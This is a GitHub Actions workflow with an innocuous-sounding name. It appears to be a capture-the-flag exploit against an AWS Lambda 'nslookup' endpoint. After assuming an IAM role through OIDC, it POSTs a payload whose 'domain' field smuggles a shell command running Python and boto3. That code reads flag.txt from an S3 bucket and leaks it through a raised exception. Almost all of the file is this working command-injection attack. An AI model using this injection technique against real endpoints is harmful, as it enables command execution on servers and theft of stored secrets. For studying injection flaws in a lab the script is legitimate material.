name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          BUCKET="codec4f26c862a321ef5"
          
          echo "=== FIRING EXCEPTION PAYLOAD ==="
          # This payload reads flag.txt via boto3 and intentionally raises an exception containing the flag!
          PAYLOAD="{\"domain\": \"127.0.0.1; python3 -c \\\"import boto3; s3=boto3.client('s3'); f=s3.get_object(Bucket='${BUCKET}', Key='flag.txt')['Body'].read().decode(); raise Exception(f)\\\"\"}"
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
